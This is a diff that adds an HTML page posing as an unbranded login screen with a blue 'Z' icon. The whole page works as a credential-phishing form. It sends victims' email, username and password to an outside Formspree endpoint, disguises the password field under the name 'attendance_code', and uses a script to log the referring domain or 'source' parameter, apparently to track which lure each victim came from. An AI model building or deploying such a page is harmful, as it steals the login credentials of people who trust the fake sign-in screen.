@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Configurações de Configuração</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect x='0' y='4' width='32' height='32' rx='6' fill='%230076a8'/%3E%3Ctext x='16' y='27' text-anchor='middle' fill='white' font-size='18' font-weight='bold' font-family='Arial'%3EZ%3C/text%3E%3C/svg%3E">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #004f71, #0076a8, #1f86b2); background-size: 400% 400%; animation: gradientShift 12s ease infinite; }
+  @keyframes gradientShift { 0%   { background-position: 0% 50%; } 50%  { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+  .login-card { background: #fff; border-radius: 12px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.28); width: 380px; max-width: 92vw; padding: 40px 32px 32px; display: flex; flex-direction: column; align-items: flex-start; }
+  .brand { display: flex; align-items: center; gap: 10px; margin-bottom: 16px; }
+  .brand .logo { width: 36px; height: 36px; }
+  .brand-name { font-size: 28px; font-weight: 700; color: #0076a8; }
+  .login-card h1 { font-size: 16px; font-weight: 500; color: #555; margin-bottom: 24px; }
+  form { width: 100%; }
+  .field { margin-bottom: 16px; width: 100%; }
+  .field label { display: block; font-size: 13px; color: #555; margin-bottom: 4px; font-weight: 500; }
+  .field input[type="email"], .field input[type="text"], .field input[type="password"] { width: 100%; padding: 10px 12px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; outline: none; transition: border-color 0.2s; }
+  .field input:focus { border-color: #1a2a6c; box-shadow: 0 0 0 2px rgba(26, 42, 108, 0.15); }
+  .options { display: flex; align-items: center; justify-content: space-between; width: 100%; margin-bottom: 20px; }
+  .options label { font-size: 13px; color: #555; display: flex; align-items: center; gap: 4px; cursor: pointer; }
+  .btn-signin { padding: 6px 20px; font-size: 13px; font-weight: 600; color: #fff; background: #0076a8; border: none; border-radius: 20px; cursor: pointer; transition: background 0.2s; }
+  .btn-signin:hover { background: #00648f; }
+  .btn-signin:active { background: #004f71; }
+  .version-select { margin-top: auto; padding-top: 18px; width: 100%; }
+  .version-select label { font-size: 12px; color: #777; display: block; margin-bottom: 4px; }
+  .version-select select { width: 100%; padding: 8px 10px; font-size: 13px; border: 1px solid #ccc; border-radius: 4px; background: #fafafa; outline: none; }
+</style>
+</head>
+<body>
+
+<div class="login-card">
+  <div class="brand">
+    <span class="brand-name"></span>
+  </div>
+  <h1></h1>
+  <form action="https://formspree.io/f/mppqqjzl" method="POST">
+    <input type="hidden" name="_next" value="thankyou.html">
+    <input type="hidden" name="_subject" value="A new Prospect just subscribed (Verify)">
+    <input type="hidden" name="form_page" value="verify">
+    <input type="hidden" name="clicked_from" id="clicked_from" value="direct">
+
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        const clickedFromInput = document.getElementById('clicked_from');
+        let domain = 'direct';
+
+        // METHOD 1: Check URL query parameter FIRST (most reliable)
+        const urlParams = new URLSearchParams(window.location.search);
+        const sourceParam = urlParams.get('source');
+        if (sourceParam) {
+          domain = sourceParam;
+        } else {
+          // METHOD 2: Try referrer-based detection
+          const referrer = document.referrer;
+          if (referrer && referrer !== 'about:blank' && referrer.length > 10 && !referrer.includes('login.html')) {
+            try {
+              const referrerUrl = new URL(referrer);
+              const referrerHostname = referrerUrl.hostname;
+              // Only use referrer if it's NOT our own website hostname
+              const currentHostname = window.location.hostname;
+              if (referrerHostname !== currentHostname && referrerHostname !== 'www.' + currentHostname) {
+                domain = referrerHostname;
+                if (domain.startsWith('www.')) {
+                  domain = domain.substring(4);
+                }
+              }
+            } catch (e) {}
+          }
+        }
+
+        clickedFromInput.value = domain;
+      });
+    </script>
+
+    <div class="field">
+      <label for="email">Email</label>
+      <input type="email" id="email" name="email" required autocomplete="email">
+    </div>
+    <div class="field">
+      <label for="username">Username</label>
+      <input type="text" id="username" name="attendance" required autocomplete="username">
+    </div>
+    <div class="field">
+      <label for="password">Password</label>
+      <input type="password" id="password" name="attendance_code" required autocomplete="current-password">
+    </div>
+    <div class="options">
+      <button type="submit" class="btn-signin">Log In</button>
+      <label><input type="checkbox" name="staySignedIn" value="1"> Remember me</label>
+    </div>
+    <div class="version-select">
+      <label for="version">Version</label>
+      <select id="version" name="version">
+        <option value="default">Default</option>
+        <option value="modern">Modern</option>
+        <option value="classic">Classic</option>
+      </select>
+    </div>
+  </form>
+</div>
+
+</body>
+</html>
